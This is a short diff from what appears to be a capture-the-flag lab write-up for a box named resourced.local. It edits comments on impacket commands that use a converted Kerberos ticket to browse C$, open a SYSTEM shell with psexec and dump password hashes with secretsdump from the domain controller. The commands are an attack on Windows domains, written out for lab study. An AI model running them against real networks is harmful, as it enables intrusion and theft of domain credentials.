@@ -105,8 +105,8 @@ impacket-ticketConverter ticket.kirbi ticket.ccache
 
 # 3. Point Kerberos at it, then use impacket with -k -no-pass
 export KRB5CCNAME=$PWD/ticket.ccache
-impacket-smbclient -k -no-pass ResourceDC.resourced.local       # browse C$
-impacket-psexec    -k -no-pass ResourceDC.resourced.local       # SYSTEM shell (rides CIFS)
+impacket-smbclient -k -no-pass ResourceDC.resourced.local       # browse C$ maybe only looking for root flag
+impacket-psexec    -k -no-pass ResourceDC.resourced.local       # SYSTEM shell (rides CIFS) for sure Administrator 
 impacket-secretsdump -k -no-pass ResourceDC.resourced.local     # dump hashes
 ```
 
